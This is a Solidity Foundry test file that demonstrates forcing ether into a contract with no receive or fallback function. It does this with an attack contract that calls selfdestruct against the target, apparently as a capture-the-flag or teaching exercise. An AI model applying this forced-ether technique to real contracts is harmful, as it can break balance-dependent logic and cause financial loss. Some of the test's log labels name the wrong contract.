// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

/*
Try to send ether to Force contract
Force implements neither receive nor fallaback functions. Calls with any value will revert.
*/

contract ContractTest is Test {
        Force ForceContract;
        Attack AttackerContract;

function testselfdestruct2() public {


    ForceContract = new Force();
    console.log("Balance of ForceContract:", address(this).balance); 
    AttackerContract = new Attack();
    console.log("Balance of ForceContract:", address(ForceContract).balance); 
    console.log("Balance of AttackerContract:", address(AttackerContract).balance); 
    AttackerContract.attack{value: 1 ether}(address(ForceContract));

    console.log("Exploit completed");
    console.log("Balance of EtherGameContract:", address(ForceContract).balance);
    }
    receive() payable external{}
}

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


contract Attack {

    function attack(address force) public payable {
    selfdestruct(payable(force));    
}  
}
